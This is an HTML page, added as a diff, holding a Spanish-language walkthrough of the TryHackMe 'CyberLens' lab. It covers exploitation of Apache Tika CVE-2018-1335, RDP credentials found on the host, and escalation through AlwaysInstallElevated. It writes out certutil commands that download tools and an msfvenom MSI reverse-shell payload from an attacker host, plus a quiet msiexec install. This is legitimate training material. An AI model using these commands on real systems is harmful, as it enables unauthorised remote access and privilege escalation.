@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="es">
+   <head>
+      <meta charset="UTF-8">
+      <link rel="stylesheet" href=../css/general.css>
+      <title>CyberLens</title>
+   </head>
+   <body>
+   	<h2>CyberLens</h2>
+   	<div>
+			<div>
+				<img src="../imagenes/Cyberlens/Cyberlans.png" alt="Cyberlans machine">
+			</div>
+			<section>
+				<nav>
+					<p>
+						Esta màquina es de dificultad fàcil, se encuentra en TryHackme y tiene dos flags, cabe recalcar que en esta oportunidad la màquina vìctima serà una windows, en primera instancia se cuenta con una vulnerabilidad al usar apache Tika 1.17 la cual es una versiòn vulnerable y permite la RCE (Remote Commands Execution), posterior a ello se tiene <b>AlwaysInstallElevated</b> activado, lo cual permite que cualquier instalación de un archivo <b>*.msi</b> se realice con privilegios elevados
+					</p>
+					<p>
+						Para comenzar, es necesario encender la maquina en la plataforma TryHakme y tener el archivo *.openvpn en nuestro dispositivo 
+					</p>
+					<p>
+						Primeramente empezamos, verificando el ttl de la màquina remota y la conecciòn a la misma , haciendo un pineo
+					</p>
+				</nav>
+				<img src="../imagenes/Cyberlens/pineo.png" alt="Pineo machine">
+				<div>
+					<nav>
+						<p>
+							Por consiguiente tenemos que en el mismo <i><b>TryHackme</b></i> nos indica que agregemos un dominio a nuestro <i>/etc/hosts</i>
+						</p>
+					</nav>
+					<img src="../imagenes/Cyberlens/hosts.png" alt="Agregando hosts">
+					 <nav>
+                  <p>
+                  	Ya teniendo el dominio agregado y la <b>IP</b> activa, procedemos a hacer un reconocimiento de los puertos con <b>nmap</b>    
+                  </p>
+               </nav>
+               <img src="../imagenes/Cyberlens/scan1.png" alt="Primer escaneo">
+					<nav>
+						<p>
+							Verificando el escaneo realizado tenemos varios puertos abiertos, sin embargo estos no presentan datos muy relevantes, pero tambièn se llega a apreciar una web, por lo cual revisamos el contenido
+						</p>
+					</nav>
+					<img src="../imagenes/Cyberlens/baseweb.png" alt="Web base">
+					<nav>
+						<p>
+							Ademàs de lanzar otro escaneo con los puertos abiertos, pero esta vez enviando scripts propios de <b>nmap</b>, con el fin de verificar versiones vulnerables o posibles credenciales. A pesar que se tiene el puerto de <b>RDP</b> en la màquina no se dispone de credenciales para acceder a esta
+						</p>
+					</nav>
+					<img src="../imagenes/Cyberlens/scan2.png" alt="Segundo escaneo">
+					<nav>
+						<p>
+							Al revisar de manera màs detallada la web, tenemos un apartado que extrae metadatos de una imagen que se cargue, por lo cual al inspeccionar la red que esta recoore para el proceso se tiene una apertura de puerto, donde posiblemente haye otro servicio corriendo
+						</p>
+					</nav>
+					<img src="../imagenes/Cyberlens/metadata.png" alt="Servicio interno">
+					<nav>
+						<p>
+							Al revisar el punto al que se envia los datos se tiene otra web donde nos muestra un nuevo servicio, pero al revisar en la web, se puede verificar que la version especìfica de esta dispone de una vulnerabilidad que permite <b>RCE (Remote Commands Execution)</b> y se detalla màs sobre ella en <b>cve-2018-1335</b> 
+						</p>
+					</nav>
+					<img src="../imagenes/Cyberlens/vulnerable.png" alt="Version tika">
+					<nav>
+						<p>
+							En este punto, es necesario tener en nuestro dispositivo local el script que realiza el ataque a este servicio vulnerable, como anteriormente se ha comentado este corresponde al exploit <b>cve-2018-1335</b>
+						</p>
+					</nav>
+					<img src="../imagenes/Cyberlens/script.png" alt="Ejecuciòn de script">
+					<nav>
+						<p>
+							Esto es lo que necesita el script para funcionar y realizar la ejecuciòn de comandos en el servidor, por lo cual ya tenemos casi todo menos lo que pretendemos ejecutar, motivo por el que en la web, voy a generar una <i>reverse shell</i> a mi màquina 
+						</p>
+					</nav>
+					<img src="../imagenes/Cyberlens/shell.png" alt="Generaciòn de shell">
+					<nav>
+						<p>
+							Para verificar la conecciòn y ver si esta respondiendo correctamente nos ponemos en escucha con <b>nc</b>, tal cual nos indica la web creadora del exploit, pero en este caso utilizarè <b>rlwrap</b> para lograr la conecciòn y asi tener una consola de windows màs interactiva y que permita mayor control de comandos, haciendo de la siguiente manera 
+						</p>
+					</nav>
+					<img src="../imagenes/Cyberlens/ejecucion.png" alt="Ejecuciòn acceso">
+					<nav>
+						<p>
+							Llegando asi a tener una conecciòn al con la màquina que aloja la web y poder navegar en esta 
+						</p>
+					</nav>
+					<img src="../imagenes/Cyberlens/primerac.png" alt="Primera conecciòn">
+					<nav>
+						<p>
+							Logrando asi encontrar la primera flag del usuario <b>Cyberlans</b> en el escritorio de este
+						</p>
+					</nav>
+					<img src="../imagenes/Cyberlens/flag1.png" alt="Primera flag">
+					<nav>
+						<p>
+							Es importante destacar que en este punto al revisar los directorios que corresponden a este usuario tambièn se puede encontrar las credenciales para acceder mediante una conecciòn con <b>RDP</b> en el directorio de <i>Documents</i>
+						</p>
+					</nav>
+					<img src="../imagenes/Cyberlens/coneccionRDP.png" alt="Credenciales para conecciòn RDP">
+					<img src="../imagenes/Cyberlens/credent.png" alt="Conecciòn RDP">
+					<nav>
+						<p>
+							Logrando asì llegar a interactuar con la màquina de forma interactiva. Por consiguiente es necesario escalar privilegios y tratar de conectarse como usuario con admistrador, por lo que en esta oportunidad para verificar posibles fallas de configuraciones o alguna vulnerabilidad vamos a pasar <b>winPEASx64.exe</b> a la màquina destino y para ello vamos a habilitar el recurso desde nuestra màquina con <b>python</b> y vamos a utilizar <b>certutil</b> en para la descarga 
+						</p>
+					</nav>
+               <div class="codigo-container">
+               	<div class="btn_cp">
+               		<a class="formB" onclick="copiarCodigo(this)"> < / ></a>
+						</div>
+							 <pre class="codigo">
+
+
+certutil -urlcache -split -f "http://&ltIP&gt:8000/winPEASx64.exe"
+							 </pre>
+					</div>
+					<br>
+					<img src="../imagenes/Cyberlens/winPEAS.png" alt="Transferencia de Winpeas">
+					<nav>
+						<p>
+							Con lo que posteriormente al ejecutar <b>winPEASx64.exe</b> en la màquina se verifica que tiene activada la funciòn <b><i>AlwaysInstallElevated</i></b> con nùmero 1 lo cual indica que esta activada, esta tarea en windows es la que permite la instalaciòn de aplicativos <b><i>*.msi</i></b> como usuario de altos privilegios 							
+						</p>
+					</nav>
+					<img src="../imagenes/Cyberlens/escalar.png" alt="Vulnerabilidad para escalar">
+					<nav>
+						<p>
+							Por consiguiente, podemos hacer uso de <b>msfvenom</b>, para crear una aplicaciòn con extensiòn <b>.msi</b>, con una <i>reverse shell</i> interna, la cual pasaremos a la màquina y mediante esta devolvamos una consola intercativa a nuestra màquia de atacante y tengamos acceso con altos privilegios en el sistema
+						</p>
+					</nav>
+               <div class="codigo-container">
+                  <div class="btn_cp">
+                     <a class="formB" onclick="copiarCodigo(this)"> < / ></a>
+                  </div>
+                      <pre class="codigo">
+
+
+msfvenom -p windows/shell_reverse_tcp -f msi -o venom.msi LHOST=&ltIP&gt LPORT=443
+                      </pre>
+               </div>
+               <br>
+					<img src="../imagenes/Cyberlens/payloadmsf.png" alt="payload msfvenom">
+					<nav>
+						<p>
+							Al ya tener la aplicaciòn para ejecutar en la màquina destino es necesario volverla a pasar, por lo que nuevamente habilitarè mi servidor con <b>python</b> al igual que antes pero esta vez bajare la app <b>venom.msi</b>
+						</p>
+					</nav>
+               <div class="codigo-container">
+                  <div class="btn_cp">
+                     <a class="formB" onclick="copiarCodigo(this)"> < / ></a>
+                  </div>
+                      <pre class="codigo">
+
+
+certutil -urlcache -split -f "http://&ltIP&gt:8000/venom.msi"
+                      </pre>
+               </div>
+               <br>
+					<img src="../imagenes/Cyberlens/venom.png" alt="Descargando venom.msi">
+					<nav>
+						<p>
+							Despuès de pasar el archivo nos ponemos en escucha con <b>rlwrap</b> nuevamente por el puerto especificado en <b>msfvenom</b>, en nuestra màquina para asì una vez la aplicaciòn se ejecute a la màquina victima automàticamente tengamos una consola conectada a ella
+						</p>
+					</nav>
+					               <div class="codigo-container">
+                  <div class="btn_cp">
+                     <a class="formB" onclick="copiarCodigo(this)"> < / ></a>
+                  </div>
+                      <pre class="codigo">
+
+
+msiexec.exe /quiet /qn /i venom.msi
+                      </pre>
+               </div>
+               <br>
+					<nav>
+						<p>
+							Al ya tener la aplicaciòn en el escritorio de la màquina, procedemos a ejecutarlo con <b><i>msiexec.exe</i></b> el cual invoca al ejecutable de windows para instalar aplicaciones <b>.msi</b>
+						</p>
+					</nav>
+					<img src="../imagenes/Cyberlens/escalamientom.png" alt="Conecciòn con msi">
+					<nav>
+						<p>
+							Logrando de esta manera tener acceso a la màquina como usuario <b>SYSTEM</b>, lo cual en windows refiere a usuario sin restricciones
+						</p>
+					</nav>
+					<img src="../imagenes/Cyberlens/coneccionsuper.png" alt="Conecciòn con pivilegios">
+				</div>
+				<nav>
+					<p>
+						Llegando asi a obtener privilegios elevados y buscando la ùltima flag que esta ùbicada en el escritorio del usuario Administrador
+					</p>
+				</nav>
+				<img src="../imagenes/Cyberlens/flag2.png" alt="Segunda flag">
+			</section>
+					
+   	</div>
+   </body>
+   <hr>
+   <footer>
+      <div>
+         Jcarlos
+      </div>
+      <div>
+         <a href="https://rb.gy/d2u7jy" target="_blank" > Linkeding </a>
+      </div>
+   </footer>
+	<script src="../js/global.js"></script>
+</html>
